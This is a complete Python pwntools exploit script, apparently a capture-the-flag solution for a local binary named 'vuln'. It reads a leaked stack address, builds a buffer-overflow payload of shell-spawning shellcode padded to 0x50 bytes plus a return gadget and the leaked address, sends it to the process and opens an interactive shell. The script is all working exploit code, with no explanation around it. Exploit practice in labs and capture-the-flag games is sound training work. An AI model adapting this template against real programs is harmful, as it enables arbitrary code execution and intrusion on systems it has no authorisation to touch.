#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './vuln')
libc = ELF(exe.libc.path) if exe.libc else None

io = process()

io.recvuntil(b"0x")
leak = int(io.recvline().strip(), 16)
log.info(f"{leak = :#x}")

payload  = b""
payload += asm(shellcraft.sh()).ljust(0x50, b'\x00')
payload += p64(0x40101a)
payload += p64(leak)

io.sendline(payload)
io.interactive()

